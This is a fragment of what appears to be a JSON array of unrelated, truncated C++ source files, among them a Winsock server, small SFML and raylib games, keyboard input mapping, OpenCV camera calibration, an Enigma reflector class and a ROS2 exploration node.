stringstream inp_stream (str);\n    std::vector <string> v;\n\n    while (std::getline (inp_stream, s, ' ')){\n\n        v.push_back (s);\n    }\n\n\n    string host_name;\n\n    for (int i = 0; i < v.size (); i++)\n    {\n        if (v[i].find(\"Host\") != std::string::npos)\n        {\n            host_name = v[i + 1];\n            break;\n        }\n    }\n\n    return host_name;\n}\n\nint grab_argon_request_port(const string& str){\n    int f = str.find(\"|ARG_ESC|\");\n\n    if (f == std::string::npos){\n        return -1;\n    }\n\n    string port_str = str.substr(0, f);\n\n    u_int64 v = port_str.find(' ');\n    while (v != std::string::npos){\n        port_str.replace(v, 1, \"\");\n\n        v = port_str.find(' ');\n    }\n\n    cout << stoi(port_str) << endl;\n\n    return stoi(port_str);\n}\n\nstring remove_request_port(string str){\n    int f = str.find(\"|ARG_ESC|\");\n\n    if (f == std::string::npos){\n        return str;\n    }\n\n    cout << str.substr(f + 9, str.length() - (f + 9)) << endl;\n\n    return str.substr(f + 9, str.length() - (f + 9));\n}\n\nint main() {\n    //std::cout << \"   __    ____   ___  _____  _  _ \\n  /__\\\\  (  _ \\\\ / __)(  _  )( \\\\( )\\n /(__)\\\\  )   /( (_-. )(_)(  )  ( \\n(__)(__)(_)\\\\_) \\\\___/(_____)(_)\\\\_)\\nStarting Server...\";\n\n    // Startup Winsock (it'll perform system specific checks during this time)\n\n    WSADATA wsa_data;\n\n    int wsa_res;\n\n    wsa_res = WSAStartup(MAKEWORD(2,2), &wsa_data);\n    if (wsa_res != 0) {\n        std::cout << \"WSA Startup Failed: Code \" << wsa_res;\n        return 1;\n    }\n\n    struct addrinfo *result = NULL, *ptr = NULL, target_address; // object that contains information about the hosted port\n\n    // cant use calloc here because calloc is specifically for array type data structures and not structs (I think)\n    ZeroMemory(&target_address, sizeof(target_address));\n\n    target_address.ai_family = AF_INET; // specifies IPV4 family addresses are expected\n    target_address.ai_socktype = SOCK_STREAM; // specifies this socket will be streaming information as it receives it\n    target_address.ai_protocol = IPPROTO_TCP; // specifies the socket will be utilizing the TCP data transfer protocol\n    target_address.ai_flags = AI_PASSIVE; // this one is weird, but how I best understand it is this tells Winsock that we intend on using this target address in a bind call (later on) and thus it knows that if the 'nodename' (first parameter) of the getaddrinfo function is NULL, it will allow all IP Adresses to query the socket (austensibly making it public)\n\n    int addr_info_res;\n\n    // Winsock is essentially double-checking our work and putting together all the info for what we want our socket to do in the result pointer\n    addr_info_res = getaddrinfo(NULL, DEFAULT_PORT, &target_address, &result);\n\n    if (addr_info_res != 0){\n        std::cout << \"'getaddrinfo' failed, check default port or code.\";\n        return 1;\n    }\n\n    // Create the actual sockets\n\n    SOCKET server_receive_socket = INVALID_SOCKET;\n\n    server_receive_socket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);\n\n    if (server_receive_socket == INVALID_SOCKET){\n        std::cout << \"Invalid socket parameters, socket failed to start error: \" << WSAGetLastError();\n\n        // Special free and cleanup functions for sockets\n        freeaddrinfo(result);\n        WSACleanup();\n        return 1;\n    }\n\n    // Before this, the socket just exists in memory untied to a specific hardware port, binding connects it directly to an actual port where it can listen for data\n\n    int bind_res;\n\n    bind_res = bind(server_receive_socket, result->ai_addr, (int)result->ai_addrlen);\n\n    if (bind_res != 0){\n        std::cout << \"Binding socket failed, error: \" << WSAGetLastError();\n\n        freeaddrinfo(result);\n        closesocket(server_receive_socket); // Socket must also be closed this time\n        WSACleanup();\n\n        return 1;\n    }\n\n    // because we now have the socket binded to hardware its data/config no longer just exists in the result variable, so we can free it to avoid wasted memory\n    freeaddrinfo(result);\n\n    // SOMAXCONN is a Winsock constant that represents the maximu",
    "#include <flecs.h>\n#include <fmt/core.h>\n\n#include <SFML/Graphics.hpp>\n#include <cassert>\n#include <iostream>\n#include <random>\n\n#include \"components.h\"\n#include \"newtype.h\"\n#include \"pathfinder.h\"\n#include \"tilemap.h\"\n#include \"trees.h\"\n#include \"util.h\"\n#include \"workers.h\"\n\nTilemap makeTilemap() {\n    using Tilemap::Grass;\n    using Tilemap::Water;\n\n    return {\n        {5, 5},\n        {\n            Water, Grass, Grass, Grass, Water,  // don't format\n            Water, Grass, Grass, Grass, Grass,  // don't format\n            Grass, Grass, Grass, Grass, Grass,  // don't format\n            Water, Grass, Grass, Grass, Water,  // don't format\n            Water, Grass, Grass, Grass, Water,  // don't format\n        }\n    };\n}\n\nsf::View   initWindow(sf::RenderWindow& window);\nPathfinder pathfinderFromTilemap(const Tilemap& map);\nvoid       simulationUpdate(\n          flecs::world& ecs, const Tilemap& map, Pathfinder& pathfinder\n      );\n\nint main() {\n    auto      window = sf::RenderWindow{{1920u, 1080u}, \"Watchem Gatherum\"};\n    sf::View  view   = initWindow(window);\n    sf::Clock frameClock;\n    sf::Clock simulationClock;\n\n    flecs::world ecs;\n    Tilemap      map        = makeTilemap();\n    Pathfinder   pathfinder = pathfinderFromTilemap(map);\n\n    registerComponents(ecs);\n    spawnWorkers(ecs, 2, map);\n    spawnTrees(ecs, 15, map);\n\n    for (int frame = 0; window.isOpen(); ++frame) {\n        sf::Time deltaTime = frameClock.restart();\n        window.clear(sf::Color::Black);\n\n        for (auto event = sf::Event{}; window.pollEvent(event);) {\n            switch (event.type) {\n                case sf::Event::Closed:\n                    window.close();\n                    break;\n                case sf::Event::Resized:\n                    view.setSize(\n                        static_cast<float>(event.size.width),\n                        static_cast<float>(event.size.height)\n                    );\n                    window.setView(view);\n                    break;\n                case sf::Event::KeyPressed:\n                    if (event.key.code == sf::Keyboard::Escape) {\n                        window.close();\n                    }\n                    break;\n                default:\n                    break;\n            }\n        }\n\n        if (simulationClock.getElapsedTime().asMilliseconds() > 500) {\n            // Only clear the debug drawer every simulation tick since \n            // it will only be written to during the simulation update\n            // and otherwise it will be cleared every frame\n            debugDrawer.clear(SIM_DEBUG_LAYER);\n\n            simulationUpdate(ecs, map, pathfinder);\n            simulationClock.restart();\n        };\n\n        map.render(window);\n\n        renderWorkers(ecs, map);\n        renderTrees(ecs, map);\n\n        textDrawer.display(window);\n        debugDrawer.display(window);\n        window.display();\n    }\n\n    // std::cout << \"Hello, World!\" << std::endl;\n}\n\nvoid simulationUpdate(\n    flecs::world& ecs, const Tilemap& map, Pathfinder& pathfinder\n) {\n    Tick* tick = ecs.get_mut<Tick>();\n    tick->v += 1;\n    fmt::println(\"[simulationUpdate] tick: {}\\n\", tick->v);\n\n    assignTasks(ecs, map);\n    updateMoveTo(ecs, map, pathfinder);\n}\n\nPathfinder pathfinderFromTilemap(const Tilemap& map) {\n    std::vector<unsigned char> pathmap(map.tiles.size());\n    std::transform(\n        map.tiles.begin(), map.tiles.end(), pathmap.begin(),\n        [](Tilemap::TileType t) { return t == Tilemap::Grass ? 1 : 0; }\n    );\n    return Pathfinder{.map = pathmap, .mapDim = map.dim};\n}\n\nsf::View initWindow(sf::RenderWindow& window) {\n    window.setFramerateLimit(144);\n    sf::Vector2u windowSize = window.getSize();\n    sf::View     view;\n    view.setCenter(0, 0);\n    view.setSize(\n        static_cast<float>(windowSize.x), static_cast<float>(windowSize.y)\n    );\n    window.setView(view);\n    return view;\n}",
    "#include \"platform/jwin_platform_input.h\"\n#include \"platform/jwin_string.h\"\n#include \"platform/utf8.h\"\n\nvoid LanguageToUtf8String(u32 Language, utf8_byte* Output)\n{\n  Language = Language % LANGUAGE_COUNT;\n  switch(Language)\n  {\n    case ENGLISH: Utf8(\"English\", Output); break;\n    case SPANISH: Utf8(\"Espa\u00f1ol\", Output); break;\n    case SWEDISH: Utf8(\"Svenska\", Output); break;\n  }\n}\n\ninternal size_t\nKeyboardButtonEnglish(jwin::keyboard_input* Keyboard, s32 ButtonCode, utf8_byte* OutputBuffer)\n{\n  b32 Shift = Active(Keyboard->Key_LSHIFT) || Active(Keyboard->Key_RSHIFT);\n  b32 Alt = Active(Keyboard->Key_LALT) || Active(Keyboard->Key_RALT);\n  b32 Ctrl = Active(Keyboard->Key_LCTRL) || Active(Keyboard->Key_RCTRL);\n  b32 ShiftMod = (!Toggled(Keyboard->Key_CPSLCK) && Shift) || (Toggled(Keyboard->Key_CPSLCK) && !Shift);\n  b32 NumLock = Toggled(Keyboard->Key_NP_NMLK);\n  switch(ButtonCode)\n  {\n    case jwin::KeyboardButton_SPACE:    {return !(Alt || Ctrl) ? Utf8(\" \", OutputBuffer) : 0;} break;\n    case jwin::KeyboardButton_TAB:      {return !(Alt || Ctrl || Shift) ? Utf8(\"\\t\", OutputBuffer) : 0;} break;\n    case jwin::KeyboardButton_1:        {return Shift ? Utf8(\"!\", OutputBuffer) : Utf8(\"1\", OutputBuffer);} break;\n    case jwin::KeyboardButton_2:        {return Shift ? Utf8(\"@\", OutputBuffer) : Utf8(\"2\", OutputBuffer);} break;\n    case jwin::KeyboardButton_3:        {return Shift ? Utf8(\"#\", OutputBuffer) : Utf8(\"3\", OutputBuffer);} break;\n    case jwin::KeyboardButton_4:        {return Shift ? Utf8(\"$\", OutputBuffer) : Utf8(\"4\", OutputBuffer);} break;\n    case jwin::KeyboardButton_5:        {return Shift ? Utf8(\"%\", OutputBuffer) : Utf8(\"5\", OutputBuffer);} break;\n    case jwin::KeyboardButton_6:        {return Shift ? Utf8(\"^\", OutputBuffer) : Utf8(\"6\", OutputBuffer);} break;\n    case jwin::KeyboardButton_7:        {return Shift ? Utf8(\"&\", OutputBuffer) : Utf8(\"7\", OutputBuffer);} break;\n    case jwin::KeyboardButton_8:        {return Shift ? Utf8(\"*\", OutputBuffer) : Utf8(\"8\", OutputBuffer);} break;\n    case jwin::KeyboardButton_9:        {return Shift ? Utf8(\"(\", OutputBuffer) : Utf8(\"9\", OutputBuffer);} break;\n    case jwin::KeyboardButton_0:        {return Shift ? Utf8(\",\", OutputBuffer) : Utf8(\"0\", OutputBuffer);} break;\n    case jwin::KeyboardButton_A:        {return ShiftMod ? Utf8(\"A\", OutputBuffer) : Utf8(\"a\", OutputBuffer);} break;\n    case jwin::KeyboardButton_B:        {return ShiftMod ? Utf8(\"B\", OutputBuffer) : Utf8(\"b\", OutputBuffer);} break;\n    case jwin::KeyboardButton_C:        {return ShiftMod ? Utf8(\"C\", OutputBuffer) : Utf8(\"c\", OutputBuffer);} break;\n    case jwin::KeyboardButton_D:        {return ShiftMod ? Utf8(\"D\", OutputBuffer) : Utf8(\"d\", OutputBuffer);} break;\n    case jwin::KeyboardButton_E:        {return ShiftMod ? Utf8(\"E\", OutputBuffer) : Utf8(\"e\", OutputBuffer);} break;\n    case jwin::KeyboardButton_F:        {return ShiftMod ? Utf8(\"F\", OutputBuffer) : Utf8(\"f\", OutputBuffer);} break;\n    case jwin::KeyboardButton_G:        {return ShiftMod ? Utf8(\"G\", OutputBuffer) : Utf8(\"g\", OutputBuffer);} break;\n    case jwin::KeyboardButton_H:        {return ShiftMod ? Utf8(\"H\", OutputBuffer) : Utf8(\"h\", OutputBuffer);} break;\n    case jwin::KeyboardButton_I:        {return ShiftMod ? Utf8(\"I\", OutputBuffer) : Utf8(\"i\", OutputBuffer);} break;\n    case jwin::KeyboardButton_J:        {return ShiftMod ? Utf8(\"J\", OutputBuffer) : Utf8(\"j\", OutputBuffer);} break;\n    case jwin::KeyboardButton_K:        {return ShiftMod ? Utf8(\"K\", OutputBuffer) : Utf8(\"k\", OutputBuffer);} break;\n    case jwin::KeyboardButton_L:        {return ShiftMod ? Utf8(\"L\", OutputBuffer) : Utf8(\"l\", OutputBuffer);} break;\n    case jwin::KeyboardButton_M:        {return ShiftMod ? Utf8(\"M\", OutputBuffer) : Utf8(\"m\", OutputBuffer);} break;\n    case jwin::KeyboardButton_N:        {return ShiftMod ? Utf8(\"N\", OutputBuffer) : Utf8(\"n\", OutputBuffer);} break;\n    case jwin::KeyboardButton_O:        {return ShiftMod ? Utf8(\"O\", OutputBuffer) : Utf8(\"o\", OutputBuffer);} break;\n    case jwin::KeyboardButton_P:        {return ShiftMod ? Utf8(\"P\", OutputBuffer) : Utf8(\"p\", OutputBuffer);} break;\n    case jwin::KeyboardButton_Q:        {return ShiftMod ? Utf8(\"Q\", OutputBuffer) : Utf8(\"q\", OutputBuffer);} break;\n    case jwin::KeyboardButton_R:        {return ShiftMod ? Utf8(\"R\", OutputBuffer) : Utf8(\"r\", OutputBuffer);} break;\n    case jwin::KeyboardButton_S:        {return ShiftMod ? Utf8(\"S\", OutputBuffer) : Utf8(\"s\", OutputBuffer);} break;\n    case jwin::KeyboardButton_T:        {return ShiftMod ? Utf8(\"T\", OutputBuffer) : Utf8(\"t\", OutputBuffer);} break;\n    case jwin::KeyboardButton_U:        {return ShiftMod ? Utf8(\"U\", OutputBuffer) : Utf8(\"u\", OutputBuffer);} break;\n    case jwin::KeyboardButton_V:        {return ShiftMod ? Utf8(\"V\", OutputBuffer) : Utf8(\"v\", OutputBuffer);} break;\n    case jwin::KeyboardButton_W:        {return ShiftMod ? Utf8(\"W\", OutputBuffer) : Utf8(\"w\", OutputBuffer);} break;\n    case jwin::KeyboardButt",
    "#include <raylib.h>\n#include <iostream>\n#include <random>\n#include <chrono>\n\n\n\n#define REDTR Color{ 200, 21, 25, 105 }\n\nTexture2D LobsterRight;\nTexture2D LobsterLeft;\n\nTexture2D Room1Wall;\nTexture2D Room2Wall;\nTexture2D Room3Wall;\nTexture2D Room4Wall;\nTexture2D Room5Wall;\n\nTexture2D itemsTexture;\nTexture2D ratTexture;\nTexture2D sobTexture;\nTexture2D Misc;\n\nTexture2D Bowl;\nTexture2D Butter;\nTexture2D Cracker;\nTexture2D Cup;\nTexture2D Fork;\nTexture2D Granade;\nTexture2D Pen;\nTexture2D Plate;\nTexture2D Stone;\nTexture2D Picture;\nTexture2D KitchenKnife;\nTexture2D ShedTexture;\n\nTexture2D KitchenTexture;\nTexture2D LampTexture1;\nTexture2D LampTexture2;\nTexture2D GrassTexture;\nTexture2D TrashcanTexture1;\nTexture2D TrashcanTexture2;\nTexture2D TrashcanTexture3;\nTexture2D DeskTexture1;\nTexture2D DeskTexture2;\nTexture2D Cloud1;\nTexture2D Cloud2;\nTexture2D Cloud3;\nTexture2D Sun;\nTexture2D WardobleTexture1;\nTexture2D WardobleTexture2;\nTexture2D BackgroundTexture;\n\n\nconst int screenWidth = 1500;\nconst int screenHeight = 800;\nbool paused = false;\nfloat gravity = 5; \n\nint tmp_int1;\nint tmp_int2;\nfloat tmp_float1;\nfloat tmp_float2;\n\nclass Menu {\npublic:\n\tint GameState = 2; // 0 - Pause, 1 - Game, 2 - Menu, 3 - Game Over Screen 4 - Victory Screen\n\tint GameOverTimer = 1000;\n\tint MenuSelect = 1;\n\tint seconds2end = 10;\n\tint milis2end = 0;\n\tfloat timer1 = 10;\n\tfloat * timer1pointer = &timer1;\n\tbool GameExit = false;\n\tbool resp = false;\n\n\n\n\n\n\tvoid StartMenu()\n\t{\n\t\tif (IsKeyPressed(KEY_S) && MenuSelect > 1)\n\t\t{\n\t\t\tMenuSelect = MenuSelect - 1;\n\t\t}\n\t\tif (IsKeyPressed(KEY_W) && MenuSelect < 3)\n\t\t{\n\t\t\tMenuSelect = MenuSelect + 1;\n\t\t}\n\n\n\t\tClearBackground(GRAY);\n\n\t\tDrawText(\"Lobster Lobster Lobster Lobster\", screenWidth / 2, screenHeight / 10, 40, WHITE);\n\t\t//printf(\"Switch %d\", MenuSelect);\n\t\tswitch(MenuSelect)\n\t\t{\n\t\t\tcase(3):\n\t\t\t{\n\t\t\t\tDrawRectangle(screenWidth / 2, screenHeight * 4 / 8, 700, 40, BLACK);\n\t\t\t\tDrawText(\"Start\", screenWidth / 2, screenHeight * 4 / 8, 40, WHITE);\n\t\t\t\tif (IsKeyPressed(KEY_SPACE))\n\t\t\t\t{\n\t\t\t\t\tGameState = 1;\n\t\t\t\t\tresp = true;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase(2):\n\t\t\t{\n\t\t\t\tDrawRectangle(screenWidth / 2, screenHeight * 5 / 8, 700, 40, BLACK);\n\t\t\t\tDrawText(\"Options are supposed to be here\", screenWidth / 2, screenHeight * 5 / 8, 40, WHITE);\n\t\t\t\tif (IsKeyPressed(KEY_SPACE))\n\t\t\t\t{\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase(1):\n\t\t\t{\n\t\t\t\tDrawRectangle(screenWidth / 2, screenHeight * 6 / 8, 700, 40, BLACK);\n\t\t\t\tDrawText(\"Exit\", screenWidth / 2, screenHeight * 6 / 8, 40, WHITE);\n\t\t\t\tif (IsKeyPressed(KEY_SPACE))\n\t\t\t\t{\n\t\t\t\t\tGameExit = true;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tbreak;\n\t\t\t}\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\n\t}\n\n\tvoid GameOver()\n\t{\n\t\t*timer1pointer = *timer1pointer - GetFrameTime();\n\n\t\tif (*timer1pointer < 0)\n\t\t{\n\t\t\tGameState = 2;\n\t\t\ttimer1 = 10;\n\t\t\tDrawRectangle(0, 0, screenWidth, screenHeight, REDTR);\n\t\t\tDrawText(\"Game Over\", screenWidth / 2, screenHeight / 10, 40, WHITE);\n\t\t\tDrawText(\"0\", screenWidth / 2, screenHeight / 2, 80, WHITE);\n\t\t\tDrawText(\"Press space to respawn\", screenWidth / 2, screenHeight * 9 / 10, 5, WHITE);\n\t\t}\n\n\t\tDrawRectangle(0, 0, screenWidth, screenHeight, REDTR);\n\t\tDrawText(\"Game Over\", screenWidth / 2, screenHeight / 10, 40, WHITE);\n\t\tDrawText(TextFormat(\"%f\", *timer1pointer), screenWidth / 2, screenHeight / 2, 80, WHITE);\n\t\tDrawText(\"Press space to respawn\", screenWidth / 2, screenHeight * 9 / 10, 5, WHITE);\n\n\t}\n};\n\nMenu menu;\n\nclass Player {\npublic:\n\n\tfloat PlayerPosX = 18000;\n\tfloat PlayerPosY = 400;\n\tfloat PlayerAccelX = 0;\n\tfloat PlayerAccelY = 0;\n\tfloat PlayerVelX = 0;\n\tfloat PlayerVelY = 0;\n\tfloat PlayerDragFactor = 0.1;\n\tfloat PlayerMass = PlayerMassBaseline;\n\tfloat PlayerMassBaseline = 10;\n\tfloat EquipmentMass = 1;\n\tfloat PlayerBreakingAccelAction = 10;\n\tfloat PlayerAccelAction = 3;\n\tfloat PlayerVelJump = 50;\n\tfloat cooldown = 10;\n\tfloat PlayerSize = 10;\n\tfloat PlayerAttackRange = 200;\n\tfloat Damage = 5;\n\n\tbool PlayerActionRenderRequired = false;\n\tbool BottomCollision = false;\n\tbool RightCollision = false;\n\tbool LeftCollision = false;\n\tbool RightItemCollision = false;\n\tbool LeftItemCollision = false;\n\tbool BottomItemCollision = false;\n\tbool isOnTopItem = false;\n\tbool PlayerActionHappend = false;\n\tbool PlayerCanPerformAction = true;\n\tbool IsPlayerDead = false;\n\tbool PlayerFacingRight = false;\n\tbool Walking = true;\n\n\tvoid PlayerUpdate()\n\t{\n\n\t\tPlayerPosX = PlayerPosX + PlayerVelX;\n\n\t\tPlayerVelX = PlayerVelX + PlayerAccelX;\n\n\t\tPlayerAccelX = PlayerAccelX / 2;\n\n\t\tif (PlayerVelX < 0)\n\t\t{\n\t\t\tPlayerAccelX = PlayerAccelX - PlayerDragFactor * PlayerVelX;\n\t\t}\n\n\t\tif (PlayerVelX > 0)\n\t\t{\n\t\t\tPlayerAccelX = PlayerAccelX - PlayerDragFactor * PlayerVelX;\n\t\t}\n\n\t\tPlayerPosY = PlayerPosY - PlayerVelY;\n\n\t\tPlayerVelY = PlayerVelY + PlayerAccelY;\n\n\t\tif (!BottomCollision || !BottomItemCollision) \n\t\t{ \n\t\t\tPlayerAccelY = PlayerAccelY - gravity; \n\t\t}\n\n\t\tPlayerAccelY = PlayerAccelY / 2;\n\n\t\tif (PlayerVelY < 0)\n\t\t{\n\t\t\tPlayerAccelY = PlayerAccelY - PlayerDragFactor * PlayerVelY;\n\t\t}\n\n\t\tif (PlayerVelY > 0)\n\t\t{\n\t\t\tPlayerAccelY = PlayerAccelY - PlayerDragFa",
    "/*\nTejasri Kasturi & Veditha Gudapati\nCS 5330 Computer Vision\nSpring 2024\nProject 4\n\nFunctions for projecting 3D points in world coordinates to 2D image pixel coordinates.\n*/\n\n#include \"virtual.h\"\n#include \"csv_util.h\"\n\n/*\n * Read Calibration\n * Given the CSV file containing calibration statistics,\n * this function retrieves the calibrated camera matrix and distortion coefficients.\n */\n\nint readCalibration(std::string csv_filename, cv::Mat &camera_matrix, cv::Mat &dist_coeff)\n{\n    char *fname_char = new char[csv_filename.length() + 1]; // Convert string to char array\n    strcpy(fname_char, csv_filename.c_str());               // Copy contents of string to char array\n\n    // Read calibration data from CSV file\n    std::cout << \"Retrieving saved calibration...\" << std::endl; // Print message indicating calibration data retrieval\n    std::vector<char *> featureName;                             // Define vector for feature names\n    std::vector<std::vector<float>> data;                        // Define vector of vectors for calibration data\n    read_image_data_csv(fname_char, featureName, data, 0);       // Read calibration data from CSV file\n\n    // Extract camera matrix and distortion coefficients from data\n    camera_matrix.at<double>(0, 0) = (double)data[0][0]; // Assign value from data to camera matrix element\n    camera_matrix.at<double>(0, 1) = (double)data[0][1]; // Assign value from data to camera matrix element\n    camera_matrix.at<double>(0, 2) = (double)data[0][2]; // Assign value from data to camera matrix element\n    camera_matrix.at<double>(1, 0) = (double)data[0][3]; // Assign value from data to camera matrix element\n    camera_matrix.at<double>(1, 1) = (double)data[0][4]; // Assign value from data to camera matrix element\n    camera_matrix.at<double>(1, 2) = (double)data[0][5]; // Assign value from data to camera matrix element\n    camera_matrix.at<double>(2, 0) = (double)data[0][6]; // Assign value from data to camera matrix element\n    camera_matrix.at<double>(2, 1) = (double)data[0][7]; // Assign value from data to camera matrix element\n    camera_matrix.at<double>(2, 2) = (double)data[0][8]; // Assign value from data to camera matrix element\n\n    dist_coeff = cv::Mat(1, 5, CV_32F); // Initialize distortion coefficients matrix\n\n    for (int i = 0; i < 5; i++)\n    {\n        dist_coeff.at<float>(0, i) = data[1][i]; // Assign values from data to distortion coefficients matrix\n    }\n\n    return (0); // Return 0 indicating successful calibration data retrieval\n}\n\n/*\n * Calculate Camera Position\n * Given below vectors containing current corner set and point set, calibrated camera matrix and distortion coefficients,\n * where the function estimates the position of the camera with respect to the target and populates arrays with rotation and translation data.\n */\nint cameraCalcPosition(std::vector<cv::Vec3f> &points, std::vector<cv::Point2f> &corners, cv::Mat &camera_matrix, cv::Mat &dist_coeff, cv::Mat &rot, cv::Mat &trans)\n{\n    // Estimate camera position using solvePnP function\n    cv::solvePnP(points, corners, camera_matrix, dist_coeff, rot, trans); // Solve PnP problem to estimate camera position\n\n    return (0); // Return 0 indicating successful calculation of camera position\n}\n\n/*\n Given a cv::Mat of the image frame, calibrated camera matrix, distortion coefficients, rotation and translation data\n from the current estimated camera position, this function projects 3D world coordinates of axes to image pixel\n coordinates on the image frame and draws lines between these points to generate the 3D axes at origin.\n */\nint draw3dAxes(cv::Mat &src, cv::Mat &camera_matrix, cv::Mat &dist_coeff, cv::Mat &rot, cv::Mat &trans)\n{\n    std::vector<cv::Vec3f> points;           // Define vector to store 3D points\n    points.push_back(cv::Vec3f({0, 0, 0}));  // Add origin point to the vector\n    points.push_back(cv::Vec3f({2, 0, 0}));  // Add point along X-axis to the vector\n    points.push_back(cv::Vec3f({0, -2, 0})); // Add point along Y-axis to the vector\n    points.push_back(cv::Vec3f({0, 0, 2}));  // Add point along Z-axis to the vector\n\n    std::vector<cv::Point2f> corners; // Define vector to store projected 2D points\n\n    // Project 3D points onto 2D image plane\n    cv::projectPoints(points, rot, trans, camera_matrix, dist_coeff, corners);\n\n    // Draw X-axis arrow on the source image\n    cv::arrowedLine(src, corners[0], corners[1], cv::Scalar(0, 0, 255), 5); // Draw X-axis arrow in red\n\n    // Draw Y-axis arrow on the source image\n    cv::arrowedLine(src, corners[0], corners[2], cv::Scalar(0, 255, 0), 5); // Draw Y-axis arrow in green\n\n    // Draw Z-axis arrow on the source image\n    cv::arrowedLine(src, corners[0], corners[3], cv::Scalar(255, 0, 0), 5); // Draw Z-axis arrow in blue\n\n    return (0); // Return 0 indicating successful drawing of 3D axes on the source image\n}\n\n/*\n Given a cv::Mat of the image frame, calibrated camera matrix, distortion coefficients, rotation and translation data\n from the",
    "#include \"reflector.h\"\n#include \"errors.h\"\n#include <iostream>\n#include <fstream>\n#include <cstdio>\n#include <cstring>\n#include <cctype>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\nReflector::Reflector(){}\n\nint Reflector::check_config(char** argv){\n    ifstream in;\n    in.open(argv[2]);\n    int number;\n    vector<int> config; //save each number into a config vector\n    // check while reading the file until eof is reached\n    while (!in.eof())\n    {\n        char character;\n        in >> ws;\n        character = in.peek();\n\n        if (character == EOF){break;}\n\n        if (!isdigit(character)){ return NON_NUMERIC_CHARACTER; }\n        else {\n            in >> number;\n\n            if (number < 0 || number > 25){ return INVALID_INDEX; }\n            // if number already exists in config\n            // sth mapped twice\n            if (find(config.begin(), config.end(), number) != config.end()){\n                return INVALID_REFLECTOR_MAPPING;\n            }\n            config.push_back(number);\n        }\n    }\n\n    in.close();\n\n    int length = config.size();\n    // reflector require 13 pairs\n    if (length/2 != 13){\n        return INCORRECT_NUMBER_OF_REFLECTOR_PARAMETERS;\n    }\n\n    //set the reflector mapping according to the .rf file\n    for (int i = 0; i < 26; i=i+2){\n        int num1 = config[i];\n        int num2 = config[i + 1];\n        reflectsto[num1] = num2;\n        reflectsto[num2] = num1;\n    }\n\n    return NO_ERROR;\n}\n\nint Reflector::encrypt(int input){\n    return reflectsto[input];\n}\n",
    "/*********************************************************************\n *\n * Software License Agreement (BSD License)\n *\n *  Copyright (c) 2008, Robert Bosch LLC.\n *  Copyright (c) 2015-2016, Jiri Horner.\n *  Copyright (c) 2021, Carlos Alvarez, Juan Galvis.\n *  All rights reserved.\n *\n *  Redistribution and use in source and binary forms, with or without\n *  modification, are permitted provided that the following conditions\n *  are met:\n *\n *   * Redistributions of source code must retain the above copyright\n *     notice, this list of conditions and the following disclaimer.\n *   * Redistributions in binary form must reproduce the above\n *     copyright notice, this list of conditions and the following\n *     disclaimer in the documentation and/or other materials provided\n *     with the distribution.\n *   * Neither the name of the Jiri Horner nor the names of its\n *     contributors may be used to endorse or promote products derived\n *     from this software without specific prior written permission.\n *\n *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n *  \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n *  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n *  FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n *  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n *  INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n *  BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n *  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n *  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n *  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n *  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n *  POSSIBILITY OF SUCH DAMAGE.\n *\n *********************************************************************/\n\n#include <explore/explore.h>\n\n#include <thread>\n\ninline static bool same_point(const geometry_msgs::msg::Point& one,\n                              const geometry_msgs::msg::Point& two)\n{\n  double dx = one.x - two.x;\n  double dy = one.y - two.y;\n  double dist = sqrt(dx * dx + dy * dy);\n  return dist < 0.01;\n}\n\nnamespace explore\n{\nExplore::Explore()\n  : Node(\"explore_node\")\n  , tf_buffer_(this->get_clock())\n  , tf_listener_(tf_buffer_)\n  , costmap_client_(*this, &tf_buffer_)\n  , prev_distance_(0)\n  , last_markers_count_(0)\n{\n  double timeout;\n  double min_frontier_size;\n  this->declare_parameter<float>(\"planner_frequency\", 1.0);\n  this->declare_parameter<float>(\"progress_timeout\", 30.0);\n  this->declare_parameter<bool>(\"visualize\", false);\n  this->declare_parameter<float>(\"potential_scale\", 1e-3);\n  this->declare_parameter<float>(\"orientation_scale\", 0.0);\n  this->declare_parameter<float>(\"gain_scale\", 1.0);\n  this->declare_parameter<float>(\"min_frontier_size\", 0.5);\n  this->declare_parameter<bool>(\"return_to_init\", false);\n\n  this->get_parameter(\"planner_frequency\", planner_frequency_);\n  this->get_parameter(\"progress_timeout\", timeout);\n  this->get_parameter(\"visualize\", visualize_);\n  this->get_parameter(\"potential_scale\", potential_scale_);\n  this->get_parameter(\"orientation_scale\", orientation_scale_);\n  this->get_parameter(\"gain_scale\", gain_scale_);\n  this->get_parameter(\"min_frontier_size\", min_frontier_size);\n  this->get_parameter(\"return_to_init\", return_to_init_);\n  this->get_parameter(\"robot_base_frame\", robot_base_frame_);\n\n  progress_timeout_ = timeout;\n  move_base_client_ =\n      rclcpp_action::create_client<nav2_msgs::action::NavigateToPose>(\n          this, ACTION_NAME);\n\n  search_ = frontier_exploration::FrontierSearch(costmap_client_.getCostmap(),\n                                                 potential_scale_, gain_scale_,\n                                                 min_frontier_size);\n\n  if (visualize_) {\n    marker_array_publisher_ =\n        this->create_publisher<visualization_msgs::msg::MarkerArray>(\"explore/\"\n                                                                     \"frontier\"\n                                                                     \"s\",\n                                                                     10);\n  }\n\n  // Subscription to resume or stop exploration\n  resume_subscription_ = this->create_subscription<std_msgs::msg::Bool>(\n      \"explore/resume\", 10,\n      std::bind(&Explore::resumeCallback, this, std::placeholders::_1));\n\n  RCLCPP_INFO(logger_, \"Waiting 